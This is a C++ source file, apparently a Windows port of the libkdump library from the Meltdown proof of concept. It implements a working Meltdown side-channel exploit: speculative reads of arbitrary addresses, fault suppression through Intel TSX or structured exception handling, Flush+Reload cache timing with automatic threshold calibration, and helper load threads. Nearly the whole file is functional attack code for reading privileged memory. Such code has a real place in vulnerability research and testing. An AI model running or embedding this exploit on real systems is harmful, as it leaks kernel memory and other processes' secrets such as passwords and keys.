#include "stdafx.h"

#include "libkdump.hpp"

#include <xmmintrin.h>
#include <intrin.h>

#define STRICT
#define NOMINMAX

#include <sdkddkver.h>
#include <Windows.h>

// seriously...
#undef ERROR

#include <vector>
#include <thread>
#include <atomic>

#include <gsl/gsl>

namespace kdump {

	libkdump_config_t libkdump_auto_config = { 0 };

	static std::byte* mem = nullptr;
	static std::vector<std::thread> load_threads;
	static std::atomic<std::size_t> end_threads;
	static size_t phys = 0;
	static int dbg = 0;

	static libkdump_config_t config;

	static __forceinline void meltdown_nonull(void) {
		uint64_t byte;

	retry:
		byte = *(volatile uint8_t*)phys;
		byte <<= 12;
		if(byte == 0) goto retry;

		*(volatile uint64_t*)(mem + byte);
	}

	static __forceinline void meltdown_fast(void) {
		uint64_t byte;

		byte = *(volatile uint8_t*)phys;
		byte <<= 12;
		*(volatile uint64_t*)(mem + byte);
	}

	static __forceinline void meltdown(void) {
		uint64_t byte;

	retry:
		*(volatile uint64_t*)0;

		byte = *(volatile uint8_t*)phys;
		byte <<= 12;
		if(byte == 0) goto retry;

		*(volatile uint64_t*)(mem + byte);
	}

#ifndef MELTDOWN
#define MELTDOWN meltdown_nonull()
#endif

	enum d_sym_t
	{
		ERR, INFO, SUCCESS
	};

	static void debug(d_sym_t symbol, const char *fmt, ...) {
		if(!dbg) {
			return;
		}

		switch(symbol) {
		case ERR:
			printf("\x1b[31;1m[-]\x1b[0m ");
			break;
		case INFO:
			printf("\x1b[33;1m[.]\x1b[0m ");
			break;
		case SUCCESS:
			printf("\x1b[32;1m[+]\x1b[0m ");
			break;
		default:
			break;
		}
		va_list ap;
		va_start(ap, fmt);
		vfprintf(stdout, fmt, ap);
		va_end(ap);
	}

	static __forceinline uint64_t rdtsc() {
		uint64_t a;
		uint32_t c;
		a = __rdtscp(&c);
		return a;
	}

	static __forceinline void maccess(void *p) {
		*(volatile size_t*)p;
	}

	static __forceinline void flush(void *p) {
		_mm_clflush(p);
	}

	static __forceinline int flush_reload(void *ptr) {
		uint64_t start = 0, end = 0;

		start = rdtsc();
		maccess(ptr);
		end = rdtsc();

		flush(ptr);

		if(end - start < config.cache_miss_threshold) {
			return 1;
		}
		return 0;
	}

	static __forceinline unsigned int xbegin(void) {
		return _xbegin();
	}

	static __forceinline void xend(void) {
		_xend();
	}

	static void nopthread() {
		while(!end_threads) {
			_mm_pause();
		}
	}

	static void syncthread() {
		HANDLE volume = ::CreateFileW(L"\\\\.\\C:", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		auto f = gsl::finally([=]() {
			::CloseHandle(volume);
		});

		while(!end_threads) {
			::FlushFileBuffers(volume);
		}
	}

	static void yieldthread() {
		while(!end_threads) {
			SwitchToThread();
		}
	}

	enum cpuid : int32_t
	{
		basic_info = 0x0000'0000i32,
		extended_features = 0x0000'0007i32,
		extended_limit = 0x8000'0000i32,
		brand_string_0 = 0x8000'0002i32,
		brand_string_1 = 0x8000'0003i32,
		brand_string_2 = 0x8000'0004i32,
		advanced_power_management = 0x8000'0007i32,
		amd_secure_memory_encryption = 0x8000'001fi32,
	};

	enum regs : int8_t
	{
		eax,
		ebx,
		ecx,
		edx
	};

	static bool check_tsx() {
		std::array<int, 4> cpu = { 0 };
		__cpuidex(cpu.data(), cpuid::basic_info, 0x0);
		if(cpu[regs::eax] < cpuid::extended_features) {
			return false;
		}
		std::array<int32_t, 4> registers = { 0 };
		__cpuidex(registers.data(), cpuid::extended_features, 0x0);
		if((1ui32 << 11ui32) == (registers[regs::ebx] & (1ui32 << 11ui32))) {
			return true;
		}
		return false;
	}

	static void detect_fault_handling() {
		if(check_tsx()) {
			debug(SUCCESS, "Using Intel TSX\n");
			config.fault_handling = TSX;
		} else {
			debug(INFO, "No Intel TSX, fallback to SEH\n");
			config.fault_handling = SEH;
		}
	}

	static void detect_flush_reload_threshold() {
		size_t reload_time = 0, flush_reload_time = 0, count = 1000000;
		size_t dummy[16];
		size_t *ptr = dummy + 8;
		uint64_t start = 0, end = 0;

		maccess(ptr);
		for(std::size_t i = 0; i < count; i++) {
			start = rdtsc();
			maccess(ptr);
			end = rdtsc();
			reload_time += (end - start);
		}
		for(std::size_t i = 0; i < count; i++) {
			start = rdtsc();
			maccess(ptr);
			end = rdtsc();
			flush(ptr);
			flush_reload_time += (end - start);
		}
		reload_time /= count;
		flush_reload_time /= count;

		debug(INFO, "Flush+Reload: %zd cycles, Reload only: %zd cycles\n", flush_reload_time, reload_time);
		config.cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
		debug(SUCCESS, "Flush+Reload threshold: %zd cycles\n", config.cache_miss_threshold);
	}

	static void auto_config() {
		debug(INFO, "Auto configuration\n");
		detect_fault_handling();
		detect_flush_reload_threshold();
		config.measurements = 3;
		config.accept_after = 1;
		config.load_threads = 1;
		config.load_type = NOP;
		config.retries = 10000;
		config.physical_offset = 0;
	}

	static int check_config() {
		if(config.cache_miss_threshold <= 0) {
			detect_flush_reload_threshold();
		}
		if(config.cache_miss_threshold <= 0) {
			return -1;
		}
		return 0;
	}

	libkdump_config_t libkdump_get_autoconfig() {
		auto_config();
		return config;
	}

	int libkdump_init(const libkdump_config_t configuration) {
		config = configuration;
		if(memcmp(&config, &libkdump_auto_config, sizeof(libkdump_config_t)) == 0) {
			auto_config();
		}

		int err = check_config();
		if(err != 0) {
			errno = err;
			return -1;
		}

		mem = static_cast<std::byte*>(::VirtualAlloc(nullptr, 0x1000 * 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
		if(!mem) {
			return -1;
		}
		std::memset(mem, 0xab, 0x1000 * 0x100);

		for(std::size_t i = 0; i < 0x100; i++) {
			flush(mem + i * 0x1000);
		}
		using thread_type = void(*)();
		thread_type thread_func = nullptr;
		switch(config.load_type) {
		case IO:
			thread_func = syncthread;
			break;
		case YIELD:
			thread_func = yieldthread;
			break;
		case NOP:
		default:
			thread_func = nopthread;
		}

		for(std::size_t i = 0; i < config.load_threads; ++i) {
			load_threads.emplace_back(thread_func);
		}

		debug(SUCCESS, "Started %d load threads\n", config.load_threads);

		return 0;
	}

	int libkdump_cleanup() {
		end_threads = 1;
		for(std::size_t i = 0; i < config.load_threads; i++) {
			load_threads[i].join();
		}
		::VirtualFree(mem, 0, MEM_RELEASE);
		debug(SUCCESS, "Everything is cleaned up, good bye!\n");
		return 0;
	}

	size_t libkdump_phys_to_virt(size_t addr) {
		return addr + config.physical_offset;
	}

	void libkdump_enable_debug(int enable) {
		dbg = enable;
	}

	static std::size_t __forceinline read_value() {
		std::size_t hit = 0;
		for(std::size_t i = 0; i < 256; i++) {
			if(flush_reload(mem + i * 4096)) {
				hit = i + 1;
			}
		}
		return hit - 1;
	}

	std::size_t libkdump_read_tsx() {
		std::size_t retries = config.retries + 1;

		while(retries--) {
			if(xbegin() == _XBEGIN_STARTED) {
				MELTDOWN;
				xend();
			}
			for(std::size_t i = 0; i < 256; i++) {
				if(flush_reload(mem + i * 4096)) {
					if(i >= 1) {
						return i;
					}
				}
			}
		}
		return 0;
	}

	std::size_t libkdump_read_seh() {
		std::size_t retries = config.retries + 1;

		while(retries--) {
			__try {
				MELTDOWN;
			} __except(EXCEPTION_EXECUTE_HANDLER) {
				;
			}

			for(std::size_t i = 0; i < 256; i++) {
				if(flush_reload(mem + i * 4096)) {
					if(i >= 1) {
						return i;
					}
				}
			}
		}
		return 0;
	}

	std::byte libkdump_read(size_t addr) {
		phys = addr;

		std::uint8_t res_stat[256];
		for(std::size_t i = 0; i < 256; ++i) {
			res_stat[i] = 0ui8;
		}

		std::size_t r;
		for(std::size_t i = 0; i < config.measurements; i++) {
			if(config.fault_handling == TSX) {
				r = libkdump_read_tsx();
			} else {
				r = libkdump_read_seh();
			}
			res_stat[r]++;
		}
		std::size_t max_v = 0;
		std::byte max_i{ 0 };

		for(std::size_t i = 1; i < 256; ++i) {
			if(res_stat[i] > max_v && res_stat[i] >= config.accept_after) {
				max_v = res_stat[i];
				max_i = static_cast<std::byte>(i);
			}
		}
		return max_i;
	}

}
